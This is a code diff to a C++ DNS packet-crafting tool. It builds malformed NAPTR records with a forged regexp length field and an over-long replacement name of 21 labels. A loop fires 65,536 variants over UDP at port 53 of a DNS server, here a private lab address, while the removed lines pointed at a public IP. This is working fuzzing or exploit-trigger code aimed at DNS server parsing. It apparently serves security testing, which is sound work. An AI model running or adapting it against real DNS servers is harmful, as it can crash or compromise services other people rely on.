@@ -9,6 +9,7 @@
 class RecordBadNAPTR : public dns::ResourceData
 {
 private:
+    int size;
     uint16_t    order;
     uint16_t    preference;
     std::string flags;
@@ -18,7 +19,8 @@ private:
     uint16_t    offset;
 
 public:
-    RecordBadNAPTR( uint16_t          in_order,
+    RecordBadNAPTR( int s,
+		    uint16_t          in_order,
                     uint16_t          in_preference,
                     const std::string &in_flags,
                     const std::string &in_services,
@@ -36,16 +38,18 @@ public:
 };
 
 
-RecordBadNAPTR::RecordBadNAPTR( uint16_t          in_order,
+RecordBadNAPTR::RecordBadNAPTR( int s,
+				uint16_t          in_order,
                                 uint16_t          in_preference,
                                 const std::string &in_flags,
                                 const std::string &in_services,
                                 const std::string &in_regexp,
                                 const dns::Domainname  &in_replacement,
                                 uint16_t          in_offset )
-    : order( in_order ),
+    : size( s ),
+      order( in_order ),
       preference( in_preference ),
-      flags( in_flags ),
+    flags( in_flags ),
     services( in_services ),
     regexp( in_regexp ),
     replacement( in_replacement ),
@@ -80,10 +84,22 @@ PacketData RecordBadNAPTR::getPacket() const
     pos = std::copy( flags.c_str(), flags.c_str() + flags.size(), pos );
     *pos++ = services.size();
     pos = std::copy( services.c_str(), services.c_str() + services.size(), pos );
-    *pos++ = regexp.size();
+    *pos++ = size;
+    //*pos++ = regexp.size();
     pos = std::copy( regexp.c_str(), regexp.c_str() + regexp.size(), pos );
   
-    PacketData replacement_packet = replacement.getPacket( offset );
+    //    PacketData replacement_packet = replacement.getPacket( offset );
+    PacketData replacement_packet;// = replacement.getPacket( offset );
+
+    const unsigned int label_size = 10;
+    for ( int k = 0 ; k < 21 ; k++ ) {
+	replacement_packet.push_back( label_size );
+	for ( int l = 0 ; l < label_size ; l++) {
+	    replacement_packet.push_back( 40 + k );
+	}
+    }
+    replacement_packet.push_back( 0 );
+
     pos = std::copy( replacement_packet.begin(), replacement_packet.end(), pos );
     return packet;
 }
@@ -91,49 +107,56 @@ PacketData RecordBadNAPTR::getPacket() const
 
 int main()
 {
-    dns::PacketInfo packet_info;
-    std::vector<dns::QuestionSectionEntry> question_section;
-    std::vector<dns::ResponseSectionEntry> answer_section, authority_section, additional_infomation_section;
+    for ( int i = 0 ; i < 256 * 256 ; i++ ) {
 
-    dns::QuestionSectionEntry question;
-    question.q_domainname = "www.example.com";
-    question.q_type       = dns::TYPE_TKEY;
-    question.q_class      = dns::CLASS_IN;
-    packet_info.question_section.push_back( question );
+	dns::PacketInfo packet_info;
+	std::vector<dns::QuestionSectionEntry> question_section;
+	std::vector<dns::ResponseSectionEntry> answer_section, authority_section, additional_infomation_section;
 
-    dns::ResponseSectionEntry additonal;
-    additonal.r_domainname = "www.example.com";
-    additonal.r_type       = dns::TYPE_A;
-    additonal.r_class      = dns::CLASS_IN;
-    additonal.r_ttl        = 30;
-    additonal.r_resource_data = dns::ResourceDataPtr( new RecordBadNAPTR( 0, 0, "a", "app", "regex", "." ) );
-    packet_info.additional_infomation_section.push_back( additonal );
+	std::ostringstream os;
+	os << i << ".";
 
-    packet_info.id                   = 1234;
-    packet_info.opcode               = 0;
-    packet_info.query_response       = 0;
-    packet_info.authoritative_answer = 0;
-    packet_info.truncation           = 0;
-    packet_info.recursion_desired    = false;
-    packet_info.recursion_available  = 0;
-    packet_info.zero_field           = 0;
-    packet_info.authentic_data       = 0;
-    packet_info.checking_disabled    = 0;
-    packet_info.response_code        = 0;
+	dns::QuestionSectionEntry question;
+	question.q_domainname = os.str() + "www.example.com";
+	question.q_type       = dns::TYPE_NAPTR;
+	question.q_class      = dns::CLASS_IN;
+	packet_info.question_section.push_back( question );
 
-    std::vector<uint8_t> packet = dns::generate_dns_packet( packet_info );
+	dns::ResponseSectionEntry additonal;
+	additonal.r_domainname = os.str() + "yyy.example.net";
+	additonal.r_type       = dns::TYPE_NAPTR;
+	additonal.r_class      = dns::CLASS_IN;
+	additonal.r_ttl        = 30;
+	additonal.r_resource_data = dns::ResourceDataPtr( new RecordBadNAPTR( 0xff & i, 0, 0, "a", "app", "regex", "a" ) );
+	packet_info.additional_infomation_section.push_back( additonal );
 
-    udpv4::ClientParameters udp_param;
-    udp_param.destination_address = "49.212.193.254";
-    udp_param.destination_port    = 53;
-    udpv4::Client udp( udp_param );
-    udp.sendPacket( packet.data(), packet.size() );
+	packet_info.id                   = i;
+	packet_info.opcode               = 0;
+	packet_info.query_response       = 0;
+	packet_info.authoritative_answer = 0;
+	packet_info.truncation           = 0;
+	packet_info.recursion_desired    = false;
+	packet_info.recursion_available  = 0;
+	packet_info.zero_field           = 0;
+	packet_info.authentic_data       = 0;
+	packet_info.checking_disabled    = 0;
+	packet_info.response_code        = 0;
 
-    udpv4::PacketInfo received_packet = udp.receivePacket();
+	std::vector<uint8_t> packet = dns::generate_dns_packet( packet_info );
 
-    dns::ResponsePacketInfo res = dns::parse_dns_response_packet( received_packet.begin(),
-                                                                  received_packet.end() );
-    std::cout << res;
+	udpv4::ClientParameters udp_param;
+	udp_param.destination_address = "192.168.33.14";
+	udp_param.destination_port    = 53;
+	udpv4::Client udp( udp_param );
+	udp.sendPacket( packet.data(), packet.size() );
+
+	udpv4::PacketInfo received_packet = udp.receivePacket();
+
+	dns::ResponsePacketInfo res = dns::parse_dns_response_packet( received_packet.begin(),
+								      received_packet.end() );
+    	std::cout << res;
+
+    }
 
     return 0;
 }
